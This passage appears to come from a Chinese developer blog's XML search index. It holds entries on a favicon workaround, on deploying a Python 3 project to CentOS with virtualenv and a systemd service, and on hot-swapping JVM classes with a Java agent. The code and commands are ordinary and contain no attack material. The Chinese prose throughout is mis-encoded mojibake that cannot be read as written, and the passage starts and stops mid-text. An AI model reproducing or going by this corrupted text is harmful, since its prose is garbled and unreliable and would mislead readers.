æ‰€ä»¥æœ€ç»ˆé‡‡ç”¨æ–¹æ¡ˆ2ï¼Œåœ¨APIæœåŠ¡ç«¯è¿™é‡Œåšä¿®æ”¹xxx.htmlçš„headä¸­æ·»åŠ å¦‚ä¸‹ï¼š1&lt;link rel="icon" href="data:image/ico;base64,aWNv"&gt; å»ºè®®ï¼šå°†æ¯ä¸ªé¡¹ç›®éƒ½ç”¨ä¸åŒçš„äºŒçº§åŸŸåæ³¨ï¼šå³ä½¿è®¾ç½®äº†äºŒçº§åŸŸåï¼ŒæŸäº›å†…æ ¸ç‰ˆæœ¬çš„æµè§ˆå™¨ä¾æ—§ä¼šè¯·æ±‚favicon.icoå›¾ç‰‡ï¼Œå¦‚æžœäºŒçº§åŸŸåæ‰¾ä¸åˆ°ï¼Œå°±ä¼šåˆ°é¡¶çº§åŸŸåæŸ¥æ‰¾ã€‚å¦‚æžœé¡¶çº§åŸŸåä¸‹å¯¹åº”çš„é¡¹ç›®æœ‰èµ„æºæ‹¦æˆªçš„ä¸šåŠ¡æŠŠicoæ‹¦æˆªäº†ï¼Œé‚£ä¹ˆä¾ç„¶æœ‰å¯èƒ½å‡ºé—®é¢˜ï¼Œæ‰€ä»¥æœåŠ¡ç«¯ä¸€å®šè¦è§„èŒƒã€‚æœ‰çš„æ—¶å€™å¦¥åä¸æ˜¯ä¸ºäº†ç›¸äº’ç”©é”…å’ŒæŽ¥é”…ï¼Œæ˜¯ä¸ºäº†æ•´ä¸ªé¡¹ç›®èƒ½å¤Ÿæ­£å¸¸è¿›è¡Œï¼Œè¦ä¸æ–­è¿›è¡Œå°è¯•ï¼Œä¸ºå¤§å±€ç€æƒ³ã€‚]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>é—®é¢˜è§£å†³</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[éƒ¨ç½²pythoné¡¹ç›®åˆ°linuxæœåŠ¡å™¨]]></title>
    <url>%2Fd8d0505b%2F</url>
    <content type="text"><![CDATA[å·¥ä½œä¹‹ä½™æˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯Pythonï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿå¿«é€Ÿçš„è§£å†³æˆ‘çš„é—®é¢˜ï¼Œæ¯”å¦‚å†™ä¸ªå¤–æŒ‚æˆ–è€…å…¶ä»–è‡ªåŠ¨åŒ–è„šæœ¬ä¹‹ç±»çš„ç¨‹åºï¼Œä¾é å¼ºå¤§çš„ç¬¬ä¸‰æ–¹åº“å¯ä»¥å¿«é€Ÿæ–¹ä¾¿çš„è§£å†³é—®é¢˜ã€‚æœ€è¿‘ç”¨Pythonå†™äº†ä¸ªå¤–æŒ‚ï¼Œéœ€è¦éƒ¨ç½²åˆ°LinuxçŽ¯å¢ƒçš„æœåŠ¡å™¨ä¸Šï¼Œç”±äºŽä¹‹å‰æœ¬åœ°å¼€å‘æ—¶ä½¿ç”¨virtualenvï¼Œä½¿ç”¨è¿™ä¸ªè™šæ‹ŸçŽ¯å¢ƒæœ‰ä¸ªå¥½å¤„æ˜¯é¡¹ç›®ä¸­ä¾èµ–çš„åº“ä¸ä¼šæ˜¯å…¨å±€çš„ï¼Œåªåœ¨å½“å‰é¡¹ç›®çš„ç›®å½•ä¸‹æœ‰æ•ˆï¼Œå› ä¸ºæˆ‘æ˜¯Macç³»ç»Ÿï¼ŒvirtualenvçŽ¯å¢ƒä¸‹çš„åº“æ–‡ä»¶å’Œlinuxä¸Šæ‰€éœ€è¦çš„åº“ä¸é€šç”¨ï¼Œæ‰€ä»¥ä¸èƒ½ç®€å•çš„å°†æ•´ä¸ªenvæ‹·è´åˆ°æœåŠ¡å™¨è¿è¡Œï¼Œéœ€è¦åšä¸€äº›é¢å¤–çš„å·¥ä½œã€‚ ä¸€èˆ¬æ¯ä¸ªä¸åŒçš„é¡¹ç›®éƒ½ä¼šä¾èµ–å„è‡ªçš„åº“ï¼Œæœ‰äº›åº“çš„ç‰ˆæœ¬ä¸ä¸€æ ·ä¼šå¼•èµ·å†²çªï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦ä½¿ç”¨è™šæ‹ŸçŽ¯å¢ƒï¼ŒPythonå¯ä»¥åœ¨æ¯ä¸ªé¡¹ç›®ç›®å½•ä¸‹åˆ›å»ºå„è‡ªçš„è™šæ‹ŸçŽ¯å¢ƒï¼Œé¡¹ç›®æ‰€ä¾èµ–çš„åŒ…å°±åœ¨çŽ¯å¢ƒç›®å½•ä¸‹ï¼Œè¿™æ ·é¿å…äº†åº“ç‰ˆæœ¬çš„å†²çªï¼Œä¹Ÿæ–¹ä¾¿ç›¸åŒæ“ä½œç³»ç»Ÿé—´å¯ä»¥å¿«é€Ÿçš„æ‹·è´é¡¹ç›®è¿è¡Œã€‚ æˆ‘ä½¿ç”¨çš„æ˜¯Python3ç¼–å†™çš„é¡¹ç›®ï¼ŒCentOS 7çš„æœåŠ¡å™¨ä¸Šåªæœ‰Python2ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…ä¸€ä¸‹Python3çš„çŽ¯å¢ƒ ç¬¬ä¸€æ­¥ï¼šå®‰è£…Python3çŽ¯å¢ƒ1.é¦–å…ˆå®‰è£…ç¼–è¯‘çŽ¯å¢ƒ(åŽç»­éœ€è¦ä»Žpythonå®˜ç½‘èŽ·å–Python3çš„æºç è‡ªå·±ç¼–è¯‘python)1yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make 2.ä»Žå®˜ç½‘ä¸‹è½½python3çš„æºç 1wget https://www.python.org/ftp/python/3.6.2/Python-3.6.2.tar.xz 3.ä¾æ¬¡æ‰§è¡Œ è§£åŽ‹&gt;è¿›å…¥è§£åŽ‹åŽçš„ç›®å½•&gt;ç¼–è¯‘å®‰è£…1234tar -xvJf Python-3.6.2.tar.xzcd Python-3.6.2./configure prefix=/usr/local/python3make &amp;&amp; make install 4.å®‰è£…å®Œæ¯•ï¼Œåˆ›å»ºè½¯è¿žæŽ¥12345ln -s /usr/local/python3/bin/python3 /usr/bin/python# æ‰§è¡Œå‘½ä»¤python -V #å°†ä¼šçœ‹åˆ°python3çš„ç‰ˆæœ¬# æ‰§è¡Œå‘½ä»¤python2 -V #å°†ä¼šçœ‹åˆ°python2çš„ç‰ˆæœ¬ 5.åŽç»­å·¥ä½œï¼Œç”±äºŽæ‰§è¡ŒCentOSçš„yumå‘½ä»¤éœ€è¦ä½¿ç”¨è‡ªå¸¦çš„python2çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦åšä¸¤å¤„ä¿®æ”¹123vim /usr/bin/yumvim /usr/libexec/urlgrabber-ext-down#å°† è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ #! /usr/bin/pythonä¿®æ”¹ä¸º #! /usr/bin/python2 ç¬¬äºŒæ­¥ï¼šå°†æœ¬åœ°å¼€å‘çŽ¯å¢ƒçš„ä¾èµ–é¡¹ç›®ç”Ÿæˆæ¸…å•æ–‡ä»¶1.åœ¨æœ¬åœ°çš„å¼€å‘çŽ¯å¢ƒä¸­ï¼Œenvä¸‹æ‰§è¡Œï¼š1pip3 freeze &gt;requirements.txt æ¸…å•æ–‡ä»¶å°†ä¼šç”Ÿæˆåœ¨å½“å‰é¡¹ç›®ç›®å½•ä¸‹ï¼Œå†…å®¹å¦‚ä¸‹æ‰€ç¤º12345certifi==2018.4.16chardet==3.0.4idna==2.7requests==2.19.1urllib3==1.23 å°†ç”ŸæˆåŽçš„æ–‡ä»¶ä¸Šä¼ åˆ°linuxæœåŠ¡å™¨ 2.å°†Pythoné¡¹ç›®ä¸Šä¼ åˆ°æœåŠ¡å™¨1#ç•¥... ç¬¬ä¸‰æ­¥ï¼šåœ¨linuxæœåŠ¡å™¨ä¸Šä¸ºé¡¹ç›®åˆ›å»ºè™šæ‹ŸçŽ¯å¢ƒï¼Œå¹¶å®‰è£…é¡¹ç›®æ‰€éœ€çš„ä¾èµ–1.åˆ‡æ¢åˆ°pip3æ‰€åœ¨çš„ç›®å½• /usr/local/python/binï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤1234567891011121314151617# å®‰è£…è™šæ‹ŸçŽ¯å¢ƒpip3 install virtualenv# åˆ›å»ºè™šæ‹ŸçŽ¯å¢ƒ ENVvirtualenv ENV# åˆ‡æ¢åˆ°è™šæ‹ŸçŽ¯å¢ƒæ‰€åœ¨çš„ç›®å½•cd ENV# å¯ç”¨è™šæ‹ŸçŽ¯å¢ƒsource ./bin/activate# å®‰è£…ä¾èµ–æ¸…å•é‡Œçš„åº“pip3 install -r requirements.txt# åˆ—å‡ºå½“å‰è™šæ‹ŸçŽ¯å¢ƒæ‰€å®‰è£…çš„ä¾èµ–åº“pip3 list ç¬¬å››æ­¥ï¼šæ·»åŠ è‡ªå®šä¹‰ç³»ç»ŸæœåŠ¡ï¼ˆå¾ˆé‡è¦ï¼‰12# è¿™æ ·çš„å‘½ä»¤åœ¨sshç»ˆç«¯é€€å‡ºåŽï¼Œpythonè¿›ç¨‹ä¹Ÿä¼šè¢«æ€æŽ‰python xxx.py &amp; éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ç³»ç»ŸæœåŠ¡ï¼Œæ¥ä¿è¯pythonç¨‹åºèƒ½å¤Ÿåœ¨åŽå°è¿è¡Œã€‚ 1.åˆ›å»ºç³»ç»ŸæœåŠ¡1vim /usr/lib/systemd/system/robot.service å†…å®¹å¦‚ä¸‹ï¼š1234567891011[Unit]Description=robotAfter=network.target [Service]Type=forkingExecStart=/usr/local/python3/bin/ENV/bin/python /usr/local/python3/bin/ENV/p3.py &amp;PrivateTmp=true [Install]WantedBy=multi-user.target ExecStartä¸ºæœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸èƒ½ç”¨ç›¸å¯¹è·¯å¾„ï¼Œ ä¸€å®šè¦å…¨è·¯å¾„ã€‚è¿™é‡Œä¹Ÿå¯ä»¥å°†å‘½ä»¤å†™åˆ°ä»»æ„çš„.shæ–‡ä»¶ä¸­ï¼Œè¿™é‡Œå†™.shæ–‡ä»¶çš„å…¨è·¯å¾„ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ 2.å¯ç”¨è‡ªå®šä¹‰ç³»ç»ŸæœåŠ¡1systemctl enable robot 3.å¯åŠ¨æœåŠ¡1systemctl start robot å¯ä»¥æŸ¥çœ‹è¿›ç¨‹ï¼Œç¡®è®¤ä¸€ä¸‹æœåŠ¡æ˜¯å¦å¯åŠ¨1ps aux|grep robot å®Œæ¯•ï¼]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŠ¨æ€æ›¿æ¢JVMä¸­çš„Classå­—èŠ‚ç ]]></title>
    <url>%2Fb67783e4%2F</url>
    <content type="text"><![CDATA[å°†ç¨‹åºæ‰“åŒ…æˆjaråŒ…ææµ‹ï¼Œç„¶åŽæµ‹è¯•å°å§å§è¿‡æ¥è·Ÿä½ è¯´ç¨‹åºæœ‰bugçš„æ—¶å€™å°±ä¸å¾—ä¸æ”¹å®Œç„¶åŽé‡æ–°æ‰“ä¸€ä¸ªjaråŒ…éƒ¨ç½²åˆ°æµ‹è¯•æœé‡æ–°è¿è¡Œã€‚æœ‰æ—¶å€™ç”šè‡³åªæ˜¯æ”¹äº†ä¸€ä¸ªç±»ä¸­çš„æŸä¸€è¡Œä»£ç ï¼Œå°±è¦å°†æ•´ä¸ªå·¥ç¨‹é‡æ–°æ‰“åŒ…ä¸Šä¼ ææµ‹ï¼Œè¿™æ ·ä¸ä»…éžå¸¸éº»çƒ¦è€Œä¸”è¿˜æµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚æ—¢ç„¶åªæ˜¯æ”¹äº†ä¸€å°éƒ¨åˆ†çš„ä»£ç ï¼Œé‚£æˆ‘ä»¬è¯•æƒ³ä¸€ä¸‹èƒ½ä¸èƒ½åŠ¨æ€æ›¿æ¢JVMä¸­çš„çš„æŸä¸ªç±»çš„å­—èŠ‚ç ï¼Œè¾¾åˆ°æ¯æ¬¡åªè¦æ›´æ–°ä¿®æ”¹çš„ä»£ç å°±å¯ä»¥è‡ªåŠ¨è¿›è¡ŒåŠ¨æ€æ›¿æ¢ï¼Œä¸éœ€è¦åšæ‰“åŒ…å’Œé‡å¯çš„å·¥ä½œã€‚ç»è¿‡éªŒè¯å‘çŽ°è¿™ç§æ–¹æ¡ˆæ˜¯å¯è¡Œçš„ã€‚ æˆ‘ä»¬åœ¨æœ¬åœ°å¼€å‘çŽ¯å¢ƒç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œåªè¦IDEè®¾ç½®äº†è‡ªåŠ¨åˆ·æ–°ï¼Œå°±å¯ä»¥è¾¾åˆ°ä¸éœ€è¦é‡å¯é¡¹ç›®å°±ç›´æŽ¥åŠ è½½ä¿®æ”¹åŽçš„ä»£ç çš„æ•ˆæžœã€‚ä¸éœ€è¦é‡å¯é¡¹ç›®å¯ä»¥ç»§ç»­è°ƒè¯•ï¼Œä¸€ç›´å¥½å¥‡æ˜¯å¦‚ä½•å®žçŽ°çš„ï¼Œç»è¿‡ç ”ç©¶å‘çŽ°ï¼Œè¿™ä¸ªåŠŸèƒ½å…¶å®žæ˜¯IDEä½¿ç”¨äº†ä»£ç†æœºåˆ¶åŽ»æ›¿æˆ‘ä»¬å®žçŽ°çš„ã€‚æ— è®ºæ˜¯è¿è¡Œåœ¨Tomcatä¸­çš„é¡¹ç›®ï¼Œè¿˜æ˜¯åƒSpring Bootè¿™æ ·å¯ä»¥æ‰“æˆjaråŒ…è¿è¡Œçš„é¡¹ç›®ï¼ˆå†…ç½®äº†Tomcatï¼‰ï¼Œåœ¨æœ¬åœ°å¼€å‘çŽ¯å¢ƒç¼–å†™çš„æ—¶å€™éƒ½ä¼šå°†classè¾“å‡ºåˆ°æŒ‡å®šç›®å½•ï¼ŒIDEå®žè´¨ä¸Šæ˜¯é€šè¿‡æ£€æµ‹ä»£ç çš„å˜åŒ–ç„¶åŽç¼–è¯‘ä¿®æ”¹çš„ä»£ç åˆ°æŒ‡å®šç›®å½•çš„classæ–‡ä»¶ï¼Œä»£ç†æ£€æµ‹åˆ°classå˜åŒ–ï¼Œå°±æŠŠå˜åŒ–çš„classé‡æ–°åŠ è½½åˆ°JVMä¸­ï¼Œå®žçŽ°åŠ¨æ€çš„æ›´æ–°ç¨‹åºã€‚ åªè¦è‡ªå·±ç¼–å†™ä¸€ä¸ªå®žçŽ°ç½‘ç»œä¼ è¾“çš„ä»£ç†å·¥å…·ï¼Œå°±å¯ä»¥å®žçŽ°ä¸æ‰“åŒ…ä¸é‡å¯é¡¹ç›®ï¼Œç›´æŽ¥è¿œç¨‹çƒ­æ›´æ–°ã€‚ åœ¨JDK1.5ä¸­å°±å¼•å…¥äº†agentmainå®žçŽ°äº†é™æ€ä»£ç†ï¼Œéœ€è¦åœ¨å¯åŠ¨ç›®æ ‡ç¨‹åºæ—¶åœ¨å‘½ä»¤è¡ŒæŒ‡å®šä»£ç†jarï¼Œè¿™ç§æ–¹å¼ä¸€èˆ¬ä¸ä¼šåœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­ä½¿ç”¨ã€‚åœ¨JDK1.6ä¸­åˆå¼•å…¥äº†premainï¼Œå®žçŽ°äº†åŠ¨æ€ä»£ç†ï¼Œå¯ä»¥ä¸ç”¨åœ¨ç›®æ ‡ç¨‹åºå¯åŠ¨æ—¶æŒ‡å®šï¼Œè€Œæ˜¯ä»¥ç‹¬ç«‹çš„ä»£ç†ç¨‹åºèŽ·å–ç›®æ ‡ç¨‹åºçš„JVMçš„pidåŠ¨æ€attachã€‚ å…¶å®žJVMæä¾›äº†å¾ˆå¤šåº•å±‚APIå’Œå·¥å…·ï¼Œå¯ä»¥å¯¹ä»»æ„çš„ASMè¿›è¡Œå„ç§æ“ä½œï¼Œåªè¦ä½ å¯¹JVMç ”ç©¶çš„è¶³å¤Ÿæ·±å…¥ï¼Œè„‘æ´žè¶³å¤Ÿå¤§ï¼Œå°±å¯ä»¥å®žçŽ°ä»»æ„ä½ æƒ³å®žçŽ°çš„åŠŸèƒ½ã€‚å°±åƒâ€œPHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ â€”â€”â€”ã€ŠPHPå®˜æ–¹æ–‡æ¡£ã€‹â€ï¼Œåœ¨JVMå±‚å¯ä»¥å¯¹å­—èŠ‚ç è¿›è¡Œæ“ä½œå°±å¯ä»¥è¾¾åˆ°åŠ¨æ€è„šæœ¬è¯­è¨€çš„åŠŸèƒ½ã€‚ ä¸‹é¢æ¼”ç¤ºä¸€ä¸‹å¦‚ä½•åŠ¨æ€æ›´æ–°JVMä¸­çš„class1.æ–°å»ºä¸€ä¸ªæ™®é€šçš„å·¥ç¨‹ AgentDemoæ–°å»ºä¸€ä¸ªUserç±»å¹¶é‡å†™toStringæ–¹æ³•è¿”å›žUserå¯¹è±¡çš„ä¿¡æ¯123456789101112131415161718/** * ç”¨æˆ·ä¿¡æ¯å®žä½“ç±» * @author è“å£«é’¦ */public class User &#123; private String name; private Integer age; public User(String name, Integer age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return "å§“åï¼š"+name +" å¹´é¾„ï¼š"+age; &#125;&#125; åœ¨Mainå‡½æ•°ä¸­ä½¿ç”¨å¾ªçŽ¯æ¯éš”3ç§’æ‰“å°ä¸€æ¬¡Userå¯¹è±¡ä¿¡æ¯123456789101112131415161718/** * ç¨‹åºå…¥å£ç±» * @author è“å£«é’¦ */public class Main &#123; public static void main(String[] args) &#123; while (true) &#123; System.out.println(new User("è“å£«é’¦", 23)); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; å°†ç¨‹åºæ‰“åŒ…æˆjaråŒ…è¿è¡Œ1java -jar AgentDemo.jar ç¨‹åºæ¯éš”3ç§’è¾“å‡ºä¸€æ¬¡Userå¯¹è±¡ä¿¡æ¯ æŽ¥ä¸‹æ¥ä½¿ç”¨ä»£ç†ç±»åœ¨ä¸é‡å¯ç›®æ ‡ç¨‹åºçš„æƒ…å†µä¸‹åŠ¨æ€æ›¿æ¢Userç±»ï¼Œé€šè¿‡æ£€æµ‹åˆ°User.classæ–‡ä»¶çš„æ›´æ–°å°†å¯¹åº”å­—èŠ‚ç ä»Žæ–°åŠ è½½åˆ°JVMä¸­ã€‚æ–°å»ºå·¥ç¨‹LoadAgentã€‚ä»£ç†ç¨‹åºéœ€è¦ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ç”¨ä½œä»£ç†çš„åŒ…å«premainæ–¹æ³•çš„javaæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯MANIFEST.MFæ–‡ä»¶ï¼Œç”¨æ¥å£°æ˜Žpremainæ–¹æ³•æ‰€åœ¨çš„javaæ–‡ä»¶çš„ä½ç½®ã€‚æ–°å»ºLoadAgent.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package com.lanshiqin.agent;import java.io.DataInputStream;import java.io.File;import java.io.FileInputStream;import java.lang.instrument.ClassDefinition;import java.lang.instrument.Instrumentation;/** * åŠ è½½ä»£ç†ç±»ï¼Œç”¨æ¥åŠ¨æ€æ›¿æ¢jvmä¸­çš„class * * @author è“å£«é’¦ */public class LoadAgent &#123; public static void premain(String agentArgs, Instrumentation instrumentation) &#123; try &#123; // ç›‘è§†çš„User.classæ‰€åœ¨çš„è·¯å¾„ï¼Œæ­¤å¤„ä¸ºäº†ç¤ºä¾‹æ¼”ç¤ºï¼Œå…ˆç›´æŽ¥ç¡¬ç¼–ç ï¼Œåªç›‘è§†æŒ‡å®šç›®å½•ä¸‹User.classçš„å˜åŒ– File f = new File("/Users/lanshiqin/Desktop/out/User.class"); // å¼€å¯ä¸€ä¸ªçº¿ç¨‹ï¼Œç”¨æ¥ç›‘è§†æ–‡ä»¶å˜åŒ– ClassFileWatcher watcher = new ClassFileWatcher(instrumentation, f); watcher.start(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * Classæ–‡ä»¶ç›‘è§†çº¿ç¨‹ç±»ï¼Œç”¨æ¥æ£€æµ‹classæ–‡ä»¶æ›´æ–° */ private static class ClassFileWatcher extends Thread &#123; private File classFile; private long lastModified; private Instrumentation instrumentation; private boolean firstRun = true; ClassFileWatcher(Instrumentation instrumentation, File classFile) &#123; this.classFile = classFile; this.instrumentation = instrumentation; lastModified = classFile.lastModified(); &#125; @Override public void run() &#123; // å¾ªçŽ¯æ£€æµ‹ while (true) &#123; // åˆ¤æ–­æ˜¯å¦ç¬¬ä¸€æ¬¡è¿è¡Œï¼Œæˆ–è€…æ–‡ä»¶æœ€åŽçš„ä¿®æ”¹æ—¶é—´ä¸Žä¸Šä¸€æ¬¡æ—¶é—´ä¸ä¸€è‡´æ—¶ if (firstRun || (lastModified != classFile.lastModified())) &#123; firstRun = false; // æ›´æ–°æ–‡ä»¶æœ€åŽä¿®æ”¹æ—¶é—´ lastModified = classFile.lastModified(); // é‡æ–°åŠ è½½class reDefineClass(instrumentation, classFile); &#125; try &#123; // æ¯éš”ä¸€ç§’ä¼‘çœ ä¸€æ¬¡ Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; /** * é‡æ–°åŠ è½½Class * @param instrumentation jvmçš„ç›‘è§†å¯¹è±¡ * @param classFile ç±»æ–‡ä»¶ */ private static void reDefineClass(Instrumentation instrumentation, File classFile) &#123; byte[] reporterClassFile = new byte[(int) classFile.length()]; DataInputStream in; try &#123; // è¯»å…¥classæ–‡ä»¶å®žä¾‹åŒ–æ•°æ®è¾“å…¥æµ in = new DataInputStream(new FileInputStream(classFile)); in.readFully(reporterClassFile); in.close(); // é€šè¿‡è¯»å…¥çš„classæ•°æ®è¾“å…¥æµå®žä¾‹åŒ–ç±»å®šä¹‰å¯¹è±¡ ClassDefinition reporterDef = new ClassDefinition(Class.forName("com.lanshiqin.demo.User"), reporterClassFile); // ä½¿ç”¨jvmç›‘è§†å¯¹è±¡é‡æ–°å®šä¹‰ç±» instrumentation.redefineClasses(reporterDef); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; åœ¨META-INFç›®å½•ä¸‹çš„MANIFEST.MFæ–‡ä»¶ä¸­æŒ‡å®š Premain-Classä¸ºæˆ‘ä»¬ç¼–å†™çš„LoadAgent123Manifest-Version: 1.0Premain-Class: com.lanshiqin.agent.LoadAgentCan-Redefine-Classes: true Can-Redefine-Classes: true æ˜¯å¿…é¡»è¦å£°æ˜Žçš„ï¼Œå¦åˆ™åœ¨instrumentation.redefineClassesçš„æ—¶å€™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ å®ŒæˆåŽå°†ä»£ç†ç¨‹åºæ‰“åŒ…æˆjaræ–‡ä»¶ LoadAgent.jarã€‚ åœ¨æ‰§è¡Œç›®æ ‡ç¨‹åºAgentDemoæ—¶ï¼Œé€šè¿‡-javaagent:xxx.jaræŒ‡å®šä»£ç†jarï¼Œå…¶ä¸­xxxä¸ºä»£ç†jarçš„æ–‡ä»¶åã€‚1java -javaagent:LoadAgent.jar -jar AgentDemo.jar å‘çŽ°æŽ§åˆ¶å°çŽ°åœ¨è¿˜æ˜¯æŒ‰ç…§jarä¸­çš„ç¨‹åºåœ¨ä¸åœçš„è¾“å‡ºç¼–è¾‘Userç±»çš„toStringæ–¹æ³•ï¼Œæ–°å¢žä¸€è¡Œè¾“å‡ºè¯­å¥ï¼Œä¿®æ”¹è¿”å›žçš„å­—ç¬¦ä¸²12345678910111213141516171819/** * ç”¨æˆ·ä¿¡æ¯å®žä½“ç±» * @author è“å£«é’¦ */public class User &#123; private String name; private Integer age; public User(String name, Integer age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; System.out.println("æ–°å¢žçš„è¾“å‡ºè¯­å¥"); return "æˆ‘çš„åå­—æ˜¯ï¼š"+name +" ä»Šå¹´ï¼š"+age +"å²"; &#125;&#125; æ‰‹åŠ¨å°†User.java ç¼–è¯‘æˆUser.class1javac User.java æ‰‹åŠ¨å°†ç”Ÿæˆçš„User.classå¤åˆ¶åˆ°æŒ‡å®šç›®å½•ä¸‹ï¼Œè§‚å¯Ÿæ­¤æ—¶æŽ§åˆ¶å°è¾“å‡ºçš„å†…å®¹ å‘çŽ°æˆ‘ä»¬æ›´æ–°æ›¿æ¢äº†User.classåŽï¼ŒåŽŸå…ˆJVMä¸­çš„User.classè¢«å®žæ—¶é‡æ–°åŠ è½½äº†ï¼Œå¹¶ä¸”æœ€æ–°ä¿®æ”¹çš„ä»£ç å·²ç»å®žæ—¶ç”Ÿæ•ˆï¼Œå¾ˆé…·æœ‰æ²¡æœ‰ðŸ˜Žã€‚ ä¸Šé¢çš„ç¤ºä¾‹é‡‡ç”¨çš„æ˜¯é™æ€ä»£ç†çš„æ–¹å¼ï¼Œéœ€è¦è¿è¡Œç›®æ ‡ç¨‹åºæ—¶é€šè¿‡æŒ‡å®šå‚æ•°æ¥è¿è¡Œã€‚ä¸€èˆ¬æ­£å¼çš„çŽ¯å¢ƒä¸‹ä¸ä¼šé‡‡ç”¨è¿™ç§æ–¹å¼åŽ»è¿è¡Œï¼Œæ›´å¤šçš„æˆ‘ä»¬å¯ä»¥è€ƒè™‘é‡‡ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼ã€‚ä½¿ç”¨ç‹¬ç«‹è¿è¡Œçš„ä»£ç†ç¨‹åºï¼ŒèŽ·å–ç›®æ ‡JVMæ‰€åœ¨çš„pidï¼Œç„¶åŽå°†ä»£ç†jaråŠ¨æ€attachåˆ°JVMä¸Šã€‚ä»£ç†ç±»ä¸­ä½¿ç”¨agentmainæ–¹æ³•123public static void agentmain(String agentArgs, Instrumentation instrumentation)&#123; // TODO åŠ¨æ€ä»£ç†&#125; åœ¨å…¥å£å‡½æ•°ä¸­é€šè¿‡ç›®æ ‡JVMçš„pidï¼ŒåŠ¨æ€çš„å°†ä»£ç†jar attachåˆ°ç›®æ ‡JVMä¸Šã€‚12VirtualMachine virtualMachine = VirtualMachine.attach(pid);virtualMachine.loadAgent("LoadAgent.jar"); åœ¨MANIFEST.MFä¸­æŒ‡å®š Agent-Class:ä¸ºagentmainæ–¹æ³•æ‰€åœ¨çš„ä»£ç†ç±»ï¼ŒæŒ‡å®šMainå…¥å£å‡½æ•°æ‰€åœ¨çš„ç±»123Manifest-Version: 1.0Agent-Class: com.lanshiqin.agent.LoadAgentMain-Class: com.lanshiqin.attach.AttachMain ä¹Ÿè®¸ä½ ä¼šè§‰å¾—é‡‡ç”¨é™æ€ä»£ç†ï¼Œå¼€å¯ä¸€ä¸ªçº¿ç¨‹åŽ»ç›‘å¬æŸä¸ªclasså˜åŒ–çš„æ–¹å¼å¾ˆlowï¼Œç¡®å®žå¾ˆlowã€‚è¿™é‡Œä»…ä»…ä½œä¸ºç®€å•çš„ç¤ºä¾‹æ¼”ç¤ºã€‚æˆ‘çš„æƒ³æ³•æ˜¯åŽç»­ç»“åˆæœåŠ¡çš„åšç‰ˆæœ¬æŽ§åˆ¶ï¼Œæ¯”å¦‚gitæäº¤åŽä½¿ç”¨webhooksè§¦å‘ä»£ç†ç¨‹åºå°†æ‰€æœ‰ä¿®æ”¹çš„classé‡æ–°åŠ è½½åˆ°JVMä¸­ã€‚è¿™ç¯‡æ–‡ç« å‚è€ƒäº†å‰äººçš„æ€è·¯ï¼Œé˜¿é‡Œå…¶å®žå·²ç»å¼€æºäº†ä¸€ä¸ªéžå¸¸å®Œå¤‡çš„è§£å†³æ–¹æ¡ˆJVM-Sandboxï¼Œä¸ä»…ä»…æ˜¯åŠ¨æ€æ›´æ–°JVMä¸­çš„Classï¼Œè€Œä¸”å¯¹JVMåšäº†å¾ˆå¤šé«˜çº§çš„æ“ä½œï¼Œæ¯”å¦‚åŠ¨æ€éžä¾µå…¥AOPï¼Œæœ‰å…´è¶£çš„å¯ä»¥æŸ¥é˜…ç›¸å…³æ–‡ç«  https://mp.weixin.qq.com/s/Nn7Yl6UzRpWnSleKUss8Sw é˜¿é‡Œçš„JVMæ²™ç®±å¾ˆå¼ºå¤§ï¼Œä»Žä¸­å¯ä»¥å­¦åˆ°å¾ˆå¤šï¼Œä½†æˆ‘å¹¶ä¸éœ€è¦é‚£ä¹ˆå¤æ‚çš„åŠŸèƒ½ã€‚æˆ‘æƒ³è¦çš„å¾ˆç®€å•ï¼Œå°±æ˜¯æƒ³Javaç¨‹åºèƒ½å¤ŸåƒPHPè¿™ç±»åŠ¨æ€è„šæœ¬ç¨‹åºä¸€æ ·ï¼Œå†™å®Œç›´æŽ¥åˆ·æ–°ï¼Œå¯ä»¥ä¸éœ€è¦é‡å¯å¿«é€Ÿæ›´æ–°åˆ°æµ‹è¯•æœï¼Œåœ¨JVMå±‚ä¸éœ€è¦å†æä»€ä¹ˆæ‰“åŒ…éƒ¨ç½²ï¼Œè€Œæ˜¯å¯ä»¥ç›´æŽ¥æ“ä½œClassè¾¾åˆ°ä»»æ„åŠŸèƒ½ã€‚ Tomcatçš„å¯åŠ¨å’ŒSpringçš„å¯åŠ¨éƒ½å„è‡ªå®žçŽ°äº†è‡ªå·±çš„ClassLoadï¼Œä»–ä»¬é€šè¿‡ç 